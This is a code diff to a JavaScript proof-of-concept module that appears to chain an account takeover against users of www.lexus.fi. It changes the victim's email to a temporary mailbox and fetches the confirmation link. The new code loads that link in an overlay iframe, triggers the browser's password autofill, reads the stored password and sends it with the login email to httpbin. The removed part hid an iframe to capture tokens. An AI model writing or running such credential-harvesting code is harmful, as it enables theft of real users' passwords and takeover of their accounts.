@@ -298,22 +298,6 @@ define([], function () {
     return "";
   }
 
-  function getCpLoaderParam() {
-    return safeCall(function () {
-      var params = new URLSearchParams(window.location.search || "");
-      return normalizeString(params.get("cp"));
-    }, "");
-  }
-
-  function buildInjectedConfirmUrl(emailToken, locale, cpParam) {
-    var token = normalizeString(emailToken);
-    if (!token || !cpParam) {
-      return "";
-    }
-    var lc = normalizeString(locale || "fi-fi").toLowerCase() || "fi-fi";
-    return window.location.origin + "/?cp=" + encodeURIComponent(cpParam) + "#/sso/changeEmail/emailToken=" + encodeURIComponent(token) + "/lc=" + encodeURIComponent(lc);
-  }
-
   function saveState(state) {
     safeCall(function () {
       localStorage.setItem(STATE_KEY, JSON.stringify(state || {}));
@@ -455,57 +439,6 @@ define([], function () {
     throw new Error("tempmail_confirmation_mail_timeout");
   }
 
-  function resolveClickUrlViaIframe(clickUrl) {
-    return new Promise(function (resolve) {
-      var iframe = document.createElement("iframe");
-      iframe.style.position = "fixed";
-      iframe.style.left = "-9999px";
-      iframe.style.width = "1px";
-      iframe.style.height = "1px";
-      iframe.style.opacity = "0";
-      document.documentElement.appendChild(iframe);
-
-      var done = false;
-      function finish(result) {
-        if (done) {
-          return;
-        }
-        done = true;
-        clearInterval(pollId);
-        clearTimeout(timeoutId);
-        safeCall(function () {
-          iframe.remove();
-        }, null);
-        resolve(result);
-      }
-
-      var pollId = setInterval(function () {
-        try {
-          var href = iframe.contentWindow && iframe.contentWindow.location && iframe.contentWindow.location.href;
-          if (!href || href === "about:blank") {
-            return;
-          }
-          if (href.indexOf("www.lexus.fi") === -1) {
-            return;
-          }
-          var token = extractEmailTokenFromUrl(href);
-          if (!token) {
-            return;
-          }
-          finish({ ok: true, finalUrl: href, emailToken: token });
-        } catch (e) {
-          return;
-        }
-      }, 350);
-
-      var timeoutId = setTimeout(function () {
-        finish({ ok: false, error: "click_redirect_timeout" });
-      }, 25000);
-
-      iframe.src = clickUrl;
-    });
-  }
-
   async function performEmailChange(ctx, targetEmail) {
     var url = ctx.aggregatorBase + "/users/" + encodeURIComponent(ctx.uuid) + "/email/change";
     var body = {
@@ -531,6 +464,131 @@ define([], function () {
       return preferred;
     }
     return document.querySelector("input[type='password']");
+  }
+
+  function findPasswordInputInDocument(doc) {
+    if (!doc) {
+      return null;
+    }
+    var preferred = safeCall(function () {
+      return doc.querySelector("input[data-test-id='-change-email-password-input']");
+    }, null);
+    if (preferred) {
+      return preferred;
+    }
+    return safeCall(function () {
+      return doc.querySelector("input[type='password']");
+    }, null);
+  }
+
+  function getOrCreateCaptureIframe(initialUrl) {
+    var iframeId = "cp-tempmail-capture-iframe";
+    var iframe = document.getElementById(iframeId);
+    if (iframe) {
+      if (initialUrl && normalizeString(iframe.getAttribute("data-initial-url")) !== normalizeString(initialUrl)) {
+        iframe.setAttribute("data-initial-url", normalizeString(initialUrl));
+        iframe.src = initialUrl;
+      }
+      return iframe;
+    }
+
+    iframe = document.createElement("iframe");
+    iframe.id = iframeId;
+    iframe.setAttribute("data-initial-url", normalizeString(initialUrl));
+    iframe.style.position = "fixed";
+    iframe.style.left = "12px";
+    iframe.style.top = "12px";
+    iframe.style.width = "calc(100vw - 24px)";
+    iframe.style.height = "calc(100vh - 96px)";
+    iframe.style.background = "#ffffff";
+    iframe.style.border = "2px solid #5aa0ff";
+    iframe.style.borderRadius = "10px";
+    iframe.style.boxShadow = "0 12px 28px rgba(0, 0, 0, 0.35)";
+    iframe.style.zIndex = "2147483646";
+    iframe.style.opacity = "1";
+    iframe.style.pointerEvents = "auto";
+    iframe.style.display = "block";
+    document.documentElement.appendChild(iframe);
+
+    if (initialUrl) {
+      iframe.src = initialUrl;
+    }
+    return iframe;
+  }
+
+  function removeCaptureIframe() {
+    var iframe = document.getElementById("cp-tempmail-capture-iframe");
+    if (!iframe) {
+      return;
+    }
+    safeCall(function () {
+      iframe.remove();
+    }, null);
+  }
+
+  function pokeAutofillOnInput(node) {
+    if (!node) {
+      return;
+    }
+    safeCall(function () {
+      var doc = node.ownerDocument || document;
+      var frameWindow = doc.defaultView || window;
+      node.autocomplete = "current-password";
+      if (frameWindow && frameWindow.focus) {
+        frameWindow.focus();
+      }
+      node.focus();
+      node.click();
+      node.dispatchEvent(new frameWindow.KeyboardEvent("keydown", { bubbles: true, key: "ArrowDown", code: "ArrowDown" }));
+    }, null);
+  }
+
+  async function waitForAutofilledPasswordInIframe(clickUrl, timeoutMs, existingIframe) {
+    var iframe = existingIframe || getOrCreateCaptureIframe(clickUrl);
+    if (clickUrl && !existingIframe) {
+      iframe.src = clickUrl;
+    }
+
+    var started = Date.now();
+    var lastHref = "";
+    while (Date.now() - started < timeoutMs) {
+      try {
+        var frameWindow = iframe.contentWindow;
+        var href = frameWindow && frameWindow.location ? normalizeString(frameWindow.location.href) : "";
+        if (href && href !== "about:blank") {
+          lastHref = href;
+        }
+
+        var doc = frameWindow && frameWindow.document ? frameWindow.document : null;
+        var node = findPasswordInputInDocument(doc);
+        if (node) {
+          var val = normalizeString(node.value);
+          if (val) {
+            return {
+              ok: true,
+              password: val,
+              source: "iframe_autofill_present",
+              iframe: iframe,
+              finalUrl: lastHref
+            };
+          }
+
+          pokeAutofillOnInput(node);
+        }
+      } catch (e) {
+        // cross-origin during redirect chain; keep polling until final same-origin frame is reachable
+      }
+
+      await sleep(700);
+    }
+
+    return {
+      ok: false,
+      password: "",
+      source: "iframe_autofill_unavailable",
+      iframe: iframe,
+      finalUrl: lastHref
+    };
   }
 
   async function waitForAutofilledPassword(timeoutMs) {
@@ -591,36 +649,80 @@ define([], function () {
     upsertSpeechBalloon("Mailbox poll", "Waiting confirmation email in temp inbox...", false);
     var mailHit = await pollConfirmationClickUrl(mailbox);
 
-    upsertSpeechBalloon("Token resolve", "Resolving tracking redirect to final change-email token...", false);
-    var resolved = await resolveClickUrlViaIframe(mailHit.clickUrl);
-    if (!resolved.ok || !resolved.emailToken) {
-      throw new Error("email_token_resolution_failed");
-    }
-
-    var cpParam = getCpLoaderParam();
-    var injectedConfirm = buildInjectedConfirmUrl(resolved.emailToken, ctx.locale, cpParam);
-
     var state = {
-      phase: "pending_confirm",
+      phase: "pending_iframe_password_capture",
       createdAt: nowIso(),
       tempEmail: mailbox.address,
       tempMailboxPassword: mailbox.password,
       mailboxTokenPrefix: mailbox.token.slice(0, 10),
-      emailToken: resolved.emailToken,
-      confirmUrl: resolved.finalUrl,
-      injectedConfirmUrl: injectedConfirm,
+      clickUrl: mailHit.clickUrl,
       emailChangeStatus: change.status
     };
-
     saveState(state);
 
-    if (injectedConfirm) {
-      upsertSpeechBalloon("Phase switch", "Token ready. Navigating to confirm modal with payload reloaded...", false);
-      window.location.href = injectedConfirm;
+    upsertSpeechBalloon("Iframe capture", "Opening confirmation link inside iframe and waiting browser autofill...", false);
+    var iframeCapture = await waitForAutofilledPasswordInIframe(mailHit.clickUrl, AUTOFILL_WAIT_MS, null);
+    if (!iframeCapture.ok || !iframeCapture.password) {
+      upsertSpeechBalloon(
+        "Iframe autofill unavailable",
+        "No auto-filled password detected yet inside iframe.\n" +
+          "Click the password field inside the iframe to trigger browser credential picker/autofill.\n\n" +
+          "Waiting extra time for late autofill/manual manager selection...",
+        true
+      );
+      iframeCapture = await waitForAutofilledPasswordInIframe("", LATE_PASSWORD_WAIT_MS, iframeCapture.iframe);
+    }
+
+    if (!iframeCapture.ok || !iframeCapture.password) {
+      saveState({
+        phase: "pending_iframe_password_capture",
+        createdAt: state.createdAt || nowIso(),
+        tempEmail: state.tempEmail || "",
+        clickUrl: mailHit.clickUrl,
+        emailChangeStatus: state.emailChangeStatus || 0,
+        lastError: "iframe_autofill_password_not_available"
+      });
+
+      upsertSpeechBalloon(
+        "Iframe autofill still unavailable",
+        "Chain is staged and waiting only for password autofill in iframe.\n" +
+          "clickUrl=\n" + mailHit.clickUrl,
+        true
+      );
+      window.__CP_TEMPMAIL_ATO_PENDING__ = {
+        reason: "iframe_autofill_password_not_available",
+        clickUrl: mailHit.clickUrl,
+        tempEmail: state.tempEmail || ""
+      };
       return;
     }
 
-    upsertSpeechBalloon("Token ready", "Could not preserve cp param automatically. Open this URL with cp param:\n" + resolved.finalUrl, true);
+    var loginEmail = normalizeString(ctx.oldEmail || ctx.originalUsername);
+    if (!loginEmail) {
+      throw new Error("login_email_missing");
+    }
+
+    upsertSpeechBalloon("Credential capture", "Autofill captured in iframe. Sending login/email + password to httpbin...", false);
+    var httpbin = await writeCredentialsToHttpbin(loginEmail, iframeCapture.password);
+    clearState();
+    removeCaptureIframe();
+
+    upsertSpeechBalloon(
+      "Capture complete",
+      "login_email=" + loginEmail + "\npassword=" + iframeCapture.password +
+        "\niframe_final_url=" + normalizeString(iframeCapture.finalUrl) +
+        "\nhttpbin_status=" + httpbin.status +
+        "\nhttpbin=" + httpbin.url,
+      false
+    );
+
+    window.__CP_TEMPMAIL_ATO_RESULT__ = {
+      loginEmail: loginEmail,
+      password: iframeCapture.password,
+      iframeFinalUrl: normalizeString(iframeCapture.finalUrl),
+      httpbinStatus: httpbin.status,
+      httpbinUrl: httpbin.url
+    };
   }
 
   async function phaseConfirmAndRotate(ctx, tokenFromUrl) {
@@ -712,7 +814,7 @@ define([], function () {
   });
 
   return {
-    version: "1.1.0-tempmail-autofill-credential-capture",
+    version: "1.2.0-tempmail-iframe-autofill-credential-capture",
     render: function () {
       return executePoC();
     }
